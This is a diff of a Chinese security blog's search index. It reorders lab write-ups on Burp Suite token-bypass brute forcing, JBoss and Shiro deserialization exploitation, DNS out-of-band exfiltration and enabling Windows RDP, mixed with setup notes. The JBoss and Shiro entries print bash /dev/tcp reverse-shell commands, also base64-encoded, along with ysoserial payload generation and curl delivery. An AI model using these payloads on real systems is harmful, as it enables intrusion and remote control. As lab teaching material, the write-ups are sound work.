@@ -1,6 +1,71 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Burpsuite绕过Token爆破</title>
+    <url>/article/4fd639c3.html</url>
+    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>Token是服务器端生成的、下发给客户端的、用来对客户端身份进行验证的一种令牌；若是Token不匹配，则不会进行身份验证。所以需要对Token进行识别匹配，从而使密码爆破能够顺利进行。</p>
+<p>环境：</p>
+<p>DVWA + Burpsuite Pro</p>
+<h1 id="二、流程"><a href="#二、流程" class="headerlink" title="二、流程"></a>二、流程</h1><p>1、使用DVWA的高级模式，进入爆破模块，进行抓包，并发送到攻击器。</p>
+<p>2、进行如下配置</p>
+<p>Position模块 </p>
+<p><img src="/article/image-20210703091039611.png" alt="image-20210703091039611" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703091039611.png" class="lozad post-image"></p>
+<pre class="highlight"><span class="line">1：攻击模式选择Pitchfork，意为多对多，一一匹配。</span><br><span class="line">2、选定密码和token字段设置变量</span><br></pre>
+
+
+
+<p>Paloads模块 – 1</p>
+<p><img src="/article/image-20210703091434571.png" alt="image-20210703091434571" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703091434571.png" class="lozad post-image"></p>
+<pre class="highlight"><span class="line">1：选定第一个变量（密码）</span><br><span class="line">2：攻击载荷选择简单列表</span><br><span class="line">3：选择从文件导入（这里做演示则随机添加了包含正确密码的若干密码）</span><br></pre>
+
+<p>注意：1处需要配置第二个变量的密码模式（token），后续会对token配置，回头再回此设置。</p>
+<p>Resource Pool模块</p>
+<p>（注：这里是最新版的多线程模块，老版本应在Request Engine处）</p>
+<p><img src="/article/image-20210703092057193.png" alt="image-20210703092057193" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703092057193.png" class="lozad post-image"></p>
+<pre class="highlight"><span class="line">多线程设置为1，因为token是服务器端生成的验证令牌，无法多线程爆破（一次只有一个token生效）</span><br></pre>
+
+
+
+<p>Option模块</p>
+<p>选择Grep Extract模块</p>
+<p><img src="/article/image-20210703092543186.png" alt="image-20210703092543186" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703092543186.png" class="lozad post-image"></p>
+<p>点击Add，依次填写</p>
+<p><img src="/article/image-20210703092442542.png" alt="image-20210703092442542" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703092442542.png" class="lozad post-image"></p>
+<pre class="highlight"><span class="line">1：获取返回包内容</span><br><span class="line">2：匹配关键字token</span><br><span class="line">3：选定token值，自动生成匹配规则</span><br><span class="line">4：OK</span><br></pre>
+
+
+
+<p>Redirections模块</p>
+<p><img src="/article/image-20210703092804701.png" alt="image-20210703092804701" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703092804701.png" class="lozad post-image"></p>
+<pre class="highlight"><span class="line">选定本次抓包的全部内容为重定向的范围（token在body的隐藏部分）</span><br></pre>
+
+
+
+<p>最后，回到Payloads模块</p>
+<p><img src="/article/image-20210703093340999.png" alt="image-20210703093340999" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703093340999.png" class="lozad post-image"></p>
+<pre class="highlight"><span class="line">1：选定第二个变量</span><br><span class="line">2：选定payload类型--递归匹配（这里选完后自动加载了刚刚配置token的匹配规则--payload option部分）</span><br><span class="line">3：粘贴抓包部分的token值--需要给定初次抓包的匹配值</span><br><span class="line">4：配置完成，开始攻击</span><br></pre>
+
+
+
+<p>3、结果</p>
+<p><img src="/article/image-20210703093746103.png" alt="image-20210703093746103" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703093746103.png" class="lozad post-image"></p>
+<pre class="highlight"><span class="line">可见token自动匹配，发包成功</span><br></pre>
+
+
+
+<p>按照长度排序（状态码相同，无法参考）</p>
+<p><img src="/article/image-20210703093937504.png" alt="image-20210703093937504" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703093937504.png" class="lozad post-image"></p>
+<p>在返回包的Render部分，可见DVWA爆破成功的界面。</p>
+<p>至此，token绕过爆破攻击结束。</p>
+]]></content>
+      <categories>
+        <category>Web渗透</category>
+      </categories>
+      <tags>
+        <tag>Token绕过</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>JavaScript基础</title>
     <url>/article/a9ba4134.html</url>
     <content><![CDATA[<h1 id="js调用方法（4种）"><a href="#js调用方法（4种）" class="headerlink" title="js调用方法（4种）"></a>js调用方法（4种）</h1><table>
@@ -205,68 +270,79 @@
       </tags>
   </entry>
   <entry>
-    <title>Burpsuite绕过Token爆破</title>
-    <url>/article/4fd639c3.html</url>
-    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>Token是服务器端生成的、下发给客户端的、用来对客户端身份进行验证的一种令牌；若是Token不匹配，则不会进行身份验证。所以需要对Token进行识别匹配，从而使密码爆破能够顺利进行。</p>
-<p>环境：</p>
-<p>DVWA + Burpsuite Pro</p>
-<h1 id="二、流程"><a href="#二、流程" class="headerlink" title="二、流程"></a>二、流程</h1><p>1、使用DVWA的高级模式，进入爆破模块，进行抓包，并发送到攻击器。</p>
-<p>2、进行如下配置</p>
-<p>Position模块 </p>
-<p><img src="/article/image-20210703091039611.png" alt="image-20210703091039611" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703091039611.png" class="lozad post-image"></p>
-<pre class="highlight"><span class="line">1：攻击模式选择Pitchfork，意为多对多，一一匹配。</span><br><span class="line">2、选定密码和token字段设置变量</span><br></pre>
+    <title>JBoss反序列化漏洞复现</title>
+    <url>/article/b552cccc.html</url>
+    <content><![CDATA[<h1 id="1、确认漏洞及类型"><a href="#1、确认漏洞及类型" class="headerlink" title="1、确认漏洞及类型"></a>1、确认漏洞及类型</h1><p>在jboss的url后缀添加如下信息，根据回显确定漏洞版本</p>
+<p>a、访问/invoker/readonly，返回500则说明存在漏洞-&gt;CVE-2017-12149</p>
+<p>b、访问/jbossmq-httpil/HTTPServerILServlet，返回This is the JBossMQ HTTP-IL则存在漏洞-&gt;CVE-2017-7504</p>
+<p>c、访问/invoker/EJBInvokerServlet,返回下载弹窗则存在漏洞-&gt;CVE-2013-4810</p>
+<p>d、访问/invoker/JMXInvokerServlet,返回下载弹窗则存在漏洞-&gt;CVE-2015-7501</p>
+<h1 id="2、制作payload"><a href="#2、制作payload" class="headerlink" title="2、制作payload"></a>2、制作payload</h1><p>工具：ysoserial.jar</p>
+<p>靶机：192.168.66.140（Ubuntu_vulhub）</p>
+<p>攻击机：192.168.66.138</p>
+<h2 id="1、写反弹shell"><a href="#1、写反弹shell" class="headerlink" title="1、写反弹shell"></a>1、写反弹shell</h2><pre class="highlight"><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.66.138/1111 0&gt;&amp;1</span><br></pre>
 
+<h2 id="2、bash64加密，勾选bash"><a href="#2、bash64加密，勾选bash" class="headerlink" title="2、bash64加密，勾选bash"></a>2、bash64加密，勾选bash</h2><p>（<a href="http://www.jackson-t.ca/runtime-exec-payloads.html%EF%BC%89">http://www.jackson-t.ca/runtime-exec-payloads.html）</a></p>
+<pre class="highlight"><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre>
 
+<h2 id="3、使用ysoserial-jar制作payload"><a href="#3、使用ysoserial-jar制作payload" class="headerlink" title="3、使用ysoserial.jar制作payload"></a>3、使用ysoserial.jar制作payload</h2><pre class="highlight"><span class="line">java -jar ysoserial.jar CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; poc.ser</span><br></pre>
 
-<p>Paloads模块 – 1</p>
-<p><img src="/article/image-20210703091434571.png" alt="image-20210703091434571" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703091434571.png" class="lozad post-image"></p>
-<pre class="highlight"><span class="line">1：选定第一个变量（密码）</span><br><span class="line">2：攻击载荷选择简单列表</span><br><span class="line">3：选择从文件导入（这里做演示则随机添加了包含正确密码的若干密码）</span><br></pre>
+<p>注：<code>CommonsCollections有1-10，5及以后有效</code></p>
+<h2 id="4、攻击机开启端口监听"><a href="#4、攻击机开启端口监听" class="headerlink" title="4、攻击机开启端口监听"></a>4、攻击机开启端口监听</h2><pre class="highlight"><span class="line">nc -lvp 1111</span><br></pre>
 
-<p>注意：1处需要配置第二个变量的密码模式（token），后续会对token配置，回头再回此设置。</p>
-<p>Resource Pool模块</p>
-<p>（注：这里是最新版的多线程模块，老版本应在Request Engine处）</p>
-<p><img src="/article/image-20210703092057193.png" alt="image-20210703092057193" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703092057193.png" class="lozad post-image"></p>
-<pre class="highlight"><span class="line">多线程设置为1，因为token是服务器端生成的验证令牌，无法多线程爆破（一次只有一个token生效）</span><br></pre>
+<h2 id="5、使用curl命令发送payload"><a href="#5、使用curl命令发送payload" class="headerlink" title="5、使用curl命令发送payload"></a>5、使用curl命令发送payload</h2><pre class="highlight"><span class="line">curl http:192.168.66.140:8080+试探目录 --data-binary @poc.ser</span><br></pre>
 
-
-
-<p>Option模块</p>
-<p>选择Grep Extract模块</p>
-<p><img src="/article/image-20210703092543186.png" alt="image-20210703092543186" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703092543186.png" class="lozad post-image"></p>
-<p>点击Add，依次填写</p>
-<p><img src="/article/image-20210703092442542.png" alt="image-20210703092442542" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703092442542.png" class="lozad post-image"></p>
-<pre class="highlight"><span class="line">1：获取返回包内容</span><br><span class="line">2：匹配关键字token</span><br><span class="line">3：选定token值，自动生成匹配规则</span><br><span class="line">4：OK</span><br></pre>
-
-
-
-<p>Redirections模块</p>
-<p><img src="/article/image-20210703092804701.png" alt="image-20210703092804701" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703092804701.png" class="lozad post-image"></p>
-<pre class="highlight"><span class="line">选定本次抓包的全部内容为重定向的范围（token在body的隐藏部分）</span><br></pre>
-
-
-
-<p>最后，回到Payloads模块</p>
-<p><img src="/article/image-20210703093340999.png" alt="image-20210703093340999" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703093340999.png" class="lozad post-image"></p>
-<pre class="highlight"><span class="line">1：选定第二个变量</span><br><span class="line">2：选定payload类型--递归匹配（这里选完后自动加载了刚刚配置token的匹配规则--payload option部分）</span><br><span class="line">3：粘贴抓包部分的token值--需要给定初次抓包的匹配值</span><br><span class="line">4：配置完成，开始攻击</span><br></pre>
-
-
-
-<p>3、结果</p>
-<p><img src="/article/image-20210703093746103.png" alt="image-20210703093746103" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703093746103.png" class="lozad post-image"></p>
-<pre class="highlight"><span class="line">可见token自动匹配，发包成功</span><br></pre>
-
-
-
-<p>按照长度排序（状态码相同，无法参考）</p>
-<p><img src="/article/image-20210703093937504.png" alt="image-20210703093937504" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703093937504.png" class="lozad post-image"></p>
-<p>在返回包的Render部分，可见DVWA爆破成功的界面。</p>
-<p>至此，token绕过爆破攻击结束。</p>
-]]></content>
+<p>注：poc版本&gt;=5</p>
+<h2 id="6、成功反弹shell"><a href="#6、成功反弹shell" class="headerlink" title="6、成功反弹shell"></a>6、成功反弹shell</h2>]]></content>
       <categories>
-        <category>Web渗透</category>
+        <category>漏洞复现</category>
       </categories>
       <tags>
-        <tag>Token绕过</tag>
+        <tag>JBoss反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Java环境变量配置及切换</title>
+    <url>/article/13b563a9.html</url>
+    <content><![CDATA[<h2 id="java8环境配置"><a href="#java8环境配置" class="headerlink" title="java8环境配置"></a>java8环境配置</h2><p>1、控制面板&gt; 系统&gt; 高级系统设置&gt; 环境变量&gt; 系统变量</p>
+<p>2、新建 JAVA_HOME</p>
+<pre class="highlight"><span class="line">C:\Program Files\Java\jdk1.8.0_281		#根据具体路径更改</span><br></pre>
+
+<p>3、新建 CLASSPATH</p>
+<pre class="highlight"><span class="line">.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;</span><br></pre>
+
+<p>4、修改 Path</p>
+<pre class="highlight"><span class="line">%JAVA_HOME%\bin;%JAVA_HOME%\jre\bin;</span><br></pre>
+
+<p>5、重启</p>
+<p>其他：Path中改单行显示为多行显示，需要将其中一个绝对路径变量放在行首，如</p>
+<pre class="highlight"><span class="line">C:\Windows\System32;		#低版本Windows系统不支持</span><br></pre>
+
+
+
+<h2 id="java11环境配置"><a href="#java11环境配置" class="headerlink" title="java11环境配置"></a>java11环境配置</h2><p>1、控制面板&gt; 系统&gt; 高级系统设置&gt; 环境变量&gt; 系统变量</p>
+<p>2、新建 JAVA_HOME</p>
+<pre class="highlight"><span class="line">C:\Program Files\Java\jdk-11.0.10		#根据具体路径更改</span><br></pre>
+
+<p>3、修改 Path</p>
+<pre class="highlight"><span class="line">%JAVA_HOME%\bin;</span><br></pre>
+
+
+
+<h2 id="Java版本切换"><a href="#Java版本切换" class="headerlink" title="Java版本切换"></a>Java版本切换</h2><p>1、新建JAVA_HOME、JAVA_HOME8、JAVA_HOME11</p>
+<p>2、新建java8.bat</p>
+<pre class="highlight"><span class="line">setx JAVA_HOME &quot;%JAVA_HOME8%&quot; /m</span><br></pre>
+
+<p>3、新建java11.bat</p>
+<pre class="highlight"><span class="line">setx JAVA_HOME &quot;%JAVA_HOME11%&quot; /m</span><br></pre>
+
+<p>注：管理员权限运行</p>
+]]></content>
+      <categories>
+        <category>环境搭建</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
       </tags>
   </entry>
   <entry>
@@ -581,38 +657,6 @@
       </tags>
   </entry>
   <entry>
-    <title>JBoss反序列化漏洞复现</title>
-    <url>/article/b552cccc.html</url>
-    <content><![CDATA[<h1 id="1、确认漏洞及类型"><a href="#1、确认漏洞及类型" class="headerlink" title="1、确认漏洞及类型"></a>1、确认漏洞及类型</h1><p>在jboss的url后缀添加如下信息，根据回显确定漏洞版本</p>
-<p>a、访问/invoker/readonly，返回500则说明存在漏洞-&gt;CVE-2017-12149</p>
-<p>b、访问/jbossmq-httpil/HTTPServerILServlet，返回This is the JBossMQ HTTP-IL则存在漏洞-&gt;CVE-2017-7504</p>
-<p>c、访问/invoker/EJBInvokerServlet,返回下载弹窗则存在漏洞-&gt;CVE-2013-4810</p>
-<p>d、访问/invoker/JMXInvokerServlet,返回下载弹窗则存在漏洞-&gt;CVE-2015-7501</p>
-<h1 id="2、制作payload"><a href="#2、制作payload" class="headerlink" title="2、制作payload"></a>2、制作payload</h1><p>工具：ysoserial.jar</p>
-<p>靶机：192.168.66.140（Ubuntu_vulhub）</p>
-<p>攻击机：192.168.66.138</p>
-<h2 id="1、写反弹shell"><a href="#1、写反弹shell" class="headerlink" title="1、写反弹shell"></a>1、写反弹shell</h2><pre class="highlight"><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.66.138/1111 0&gt;&amp;1</span><br></pre>
-
-<h2 id="2、bash64加密，勾选bash"><a href="#2、bash64加密，勾选bash" class="headerlink" title="2、bash64加密，勾选bash"></a>2、bash64加密，勾选bash</h2><p>（<a href="http://www.jackson-t.ca/runtime-exec-payloads.html%EF%BC%89">http://www.jackson-t.ca/runtime-exec-payloads.html）</a></p>
-<pre class="highlight"><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre>
-
-<h2 id="3、使用ysoserial-jar制作payload"><a href="#3、使用ysoserial-jar制作payload" class="headerlink" title="3、使用ysoserial.jar制作payload"></a>3、使用ysoserial.jar制作payload</h2><pre class="highlight"><span class="line">java -jar ysoserial.jar CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; poc.ser</span><br></pre>
-
-<p>注：<code>CommonsCollections有1-10，5及以后有效</code></p>
-<h2 id="4、攻击机开启端口监听"><a href="#4、攻击机开启端口监听" class="headerlink" title="4、攻击机开启端口监听"></a>4、攻击机开启端口监听</h2><pre class="highlight"><span class="line">nc -lvp 1111</span><br></pre>
-
-<h2 id="5、使用curl命令发送payload"><a href="#5、使用curl命令发送payload" class="headerlink" title="5、使用curl命令发送payload"></a>5、使用curl命令发送payload</h2><pre class="highlight"><span class="line">curl http:192.168.66.140:8080+试探目录 --data-binary @poc.ser</span><br></pre>
-
-<p>注：poc版本&gt;=5</p>
-<h2 id="6、成功反弹shell"><a href="#6、成功反弹shell" class="headerlink" title="6、成功反弹shell"></a>6、成功反弹shell</h2>]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>JBoss反序列化</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>MS17-010漏洞复现</title>
     <url>/article/484411d0.html</url>
     <content><![CDATA[<h1 id="一、简介："><a href="#一、简介：" class="headerlink" title="一、简介："></a>一、简介：</h1><p>MS17-010又称为永恒之蓝，通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞。目前已知受影响的Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。</p>
@@ -851,51 +895,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Shiro反序列化漏洞复现</title>
-    <url>/article/12dfe94f.html</url>
-    <content><![CDATA[<h1 id="1、探测"><a href="#1、探测" class="headerlink" title="1、探测"></a>1、探测</h1><p>在登录界面回包中，有rememberMe=deleteMe参数，说明使用Shiro反序列化。</p>
-<h1 id="2、利用"><a href="#2、利用" class="headerlink" title="2、利用"></a>2、利用</h1><p>a、使用shiroExploit工具检测，反弹shell</p>
-<pre class="highlight"><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre>
-
-<p>b、使用xray检测，直接发送payload</p>
-<pre class="highlight"><span class="line">xray webscan --url &quot;http://&quot; --html-output 1.html</span><br></pre>
-
-<p>或指定脚本检测</p>
-<pre class="highlight"><span class="line">xray webscan --url &quot;http://&quot; --plugins shiro --html-output 1.html</span><br></pre>
-
-<p>将发包贴入burpsuite发包，将Testecho: namzzg修改为Testcmd:ls即可执行对应指令，也可反弹shell，语句同上</p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>Shiro反序列</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Ubuntu安装Python3</title>
-    <url>/article/5e5d43b.html</url>
-    <content><![CDATA[<p>1、卸载旧版python</p>
-<pre class="highlight"><span class="line">sudo apt-get remove python</span><br></pre>
-
-<p>2、安装新版python</p>
-<pre class="highlight"><span class="line">sudo apt-get install python3</span><br></pre>
-
-<p>3、切换默认python环境</p>
-<pre class="highlight"><span class="line">echo alias python=python3 &gt;&gt; ~/.bashrc  #切换python默认版本类型</span><br><span class="line">source ~/.bashrc  						#更新配置文件的命令，只更新当前终端上的配置</span><br></pre>
-
-<p>4、查看默认的python版本</p>
-<pre class="highlight"><span class="line">python --version</span><br></pre>
-
-]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>Python3</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Typora常用快捷键</title>
     <url>/article/12a67745.html</url>
     <content><![CDATA[<table>
@@ -949,6 +948,51 @@
       </tags>
   </entry>
   <entry>
+    <title>Shiro反序列化漏洞复现</title>
+    <url>/article/12dfe94f.html</url>
+    <content><![CDATA[<h1 id="1、探测"><a href="#1、探测" class="headerlink" title="1、探测"></a>1、探测</h1><p>在登录界面回包中，有rememberMe=deleteMe参数，说明使用Shiro反序列化。</p>
+<h1 id="2、利用"><a href="#2、利用" class="headerlink" title="2、利用"></a>2、利用</h1><p>a、使用shiroExploit工具检测，反弹shell</p>
+<pre class="highlight"><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre>
+
+<p>b、使用xray检测，直接发送payload</p>
+<pre class="highlight"><span class="line">xray webscan --url &quot;http://&quot; --html-output 1.html</span><br></pre>
+
+<p>或指定脚本检测</p>
+<pre class="highlight"><span class="line">xray webscan --url &quot;http://&quot; --plugins shiro --html-output 1.html</span><br></pre>
+
+<p>将发包贴入burpsuite发包，将Testecho: namzzg修改为Testcmd:ls即可执行对应指令，也可反弹shell，语句同上</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Shiro反序列</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Ubuntu安装Python3</title>
+    <url>/article/5e5d43b.html</url>
+    <content><![CDATA[<p>1、卸载旧版python</p>
+<pre class="highlight"><span class="line">sudo apt-get remove python</span><br></pre>
+
+<p>2、安装新版python</p>
+<pre class="highlight"><span class="line">sudo apt-get install python3</span><br></pre>
+
+<p>3、切换默认python环境</p>
+<pre class="highlight"><span class="line">echo alias python=python3 &gt;&gt; ~/.bashrc  #切换python默认版本类型</span><br><span class="line">source ~/.bashrc  						#更新配置文件的命令，只更新当前终端上的配置</span><br></pre>
+
+<p>4、查看默认的python版本</p>
+<pre class="highlight"><span class="line">python --version</span><br></pre>
+
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Python3</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Ubuntu搭建Docker + Vulhub</title>
     <url>/article/a438e427.html</url>
     <content><![CDATA[<h1 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h1><p>1、在线安装docker</p>
@@ -989,83 +1033,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Web渗透随记</title>
-    <url>/article/3d2e94d4.html</url>
-    <content><![CDATA[<h1 id="DNS外带"><a href="#DNS外带" class="headerlink" title="DNS外带"></a>DNS外带</h1><p>平台：</p>
-<p><a href="http://dnslog.cn/">http://dnslog.cn/</a>        #需要生成随机DNS</p>
-<p>使用：</p>
-<pre class="highlight"><span class="line">ping `whoami`.dns</span><br></pre>
-
-<p>（注：``为优先运行符，可以用$()代替）</p>
-<p>适用：</p>
-<p>注入、反序列化、命令执行等无回显情况下，外带数据看结果</p>
-<h1 id="Windows开启3389端口"><a href="#Windows开启3389端口" class="headerlink" title="Windows开启3389端口"></a>Windows开启3389端口</h1><p>注：Win7、Win2003、XP系统</p>
-<p>开启：</p>
-<pre class="highlight"><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre>
-
-<p>关闭：</p>
-<pre class="highlight"><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f</span><br></pre>
-
-]]></content>
-      <categories>
-        <category>Web渗透</category>
-      </categories>
-      <tags>
-        <tag>随记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Windows搭建IIS + mssql</title>
-    <url>/article/ddd2791b.html</url>
-    <content><![CDATA[<h1 id="一、搭建IIS服务"><a href="#一、搭建IIS服务" class="headerlink" title="一、搭建IIS服务"></a>一、搭建IIS服务</h1><h2 id="1、搭建IIS服务"><a href="#1、搭建IIS服务" class="headerlink" title="1、搭建IIS服务"></a>1、搭建IIS服务</h2><p>开始-管理工具-服务器管理器-角色-IIS服务-自定义服务（ASP模块、FTP模块等）</p>
-<h2 id="2、导入ASP网站"><a href="#2、导入ASP网站" class="headerlink" title="2、导入ASP网站"></a>2、导入ASP网站</h2><p>选择网站路径</p>
-<p>修改网站访问端口号</p>
-<h2 id="3、网站配置"><a href="#3、网站配置" class="headerlink" title="3、网站配置"></a>3、网站配置</h2><table>
-<thead>
-<tr>
-<th>报错类型</th>
-<th>做法</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>403（无访问主程序）</td>
-<td>修改默认文档，增加index.asp</td>
-</tr>
-<tr>
-<td>500（无法访问文件）</td>
-<td>ASP-启用父路径</td>
-</tr>
-<tr>
-<td>提示未启用32位程序池</td>
-<td>应用程序池-网站-高级设置-32位应用程序池-True</td>
-</tr>
-<tr>
-<td>没有操作权限</td>
-<td>修改www目录权限：  属性-安全-编辑-修改Users权限为完全控制</td>
-</tr>
-</tbody></table>
-<h1 id="安装SQL-Server数据库并导入原有数据库"><a href="#安装SQL-Server数据库并导入原有数据库" class="headerlink" title="安装SQL Server数据库并导入原有数据库"></a>安装SQL Server数据库并导入原有数据库</h1><p>1、winserver2008连接sql server镜像，选择安装（精简功能）</p>
-<p> <img src="/article/1.png" alt="1" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/1.png" class="lozad post-image"></p>
-<p>2、限制数据库权限（从管理员权限降权）</p>
-<p> <img src="/article/2.png" alt="2" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/2.png" class="lozad post-image"></p>
-<p>3、混合模式，设置密码，添加管理员</p>
-<p> <img src="/article/3.png" alt="3" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/3.png" class="lozad post-image"></p>
-<p>4、后续全部确认即可</p>
-<p>5、新建数据库（testdb）</p>
-<p>6、修改网站数据库配置文件，数据库类型为mssql</p>
-<p>7、替换网站原有数据库</p>
-<p>8、修改网站数据库配置文件</p>
-<p>新增数据库名（testdb）、数据库账号（sa）、数据库密码（***）</p>
-<p>注意：mssql账号为sa</p>
-]]></content>
-      <categories>
-        <category>Windows</category>
-      </categories>
-      <tags>
-        <tag>IIS</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Windows多个Java环境共存</title>
     <url>/article/5915dfc0.html</url>
     <content><![CDATA[<h1 id="java8环境配置"><a href="#java8环境配置" class="headerlink" title="java8环境配置"></a>java8环境配置</h1><p>1、控制面板&gt; 系统&gt; 高级系统设置&gt; 环境变量&gt; 系统变量</p>
@@ -1103,6 +1070,32 @@
 ]]></content>
       <tags>
         <tag>Java环境配置</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Web渗透随记</title>
+    <url>/article/3d2e94d4.html</url>
+    <content><![CDATA[<h1 id="DNS外带"><a href="#DNS外带" class="headerlink" title="DNS外带"></a>DNS外带</h1><p>平台：</p>
+<p><a href="http://dnslog.cn/">http://dnslog.cn/</a>        #需要生成随机DNS</p>
+<p>使用：</p>
+<pre class="highlight"><span class="line">ping `whoami`.dns</span><br></pre>
+
+<p>（注：``为优先运行符，可以用$()代替）</p>
+<p>适用：</p>
+<p>注入、反序列化、命令执行等无回显情况下，外带数据看结果</p>
+<h1 id="Windows开启3389端口"><a href="#Windows开启3389端口" class="headerlink" title="Windows开启3389端口"></a>Windows开启3389端口</h1><p>注：Win7、Win2003、XP系统</p>
+<p>开启：</p>
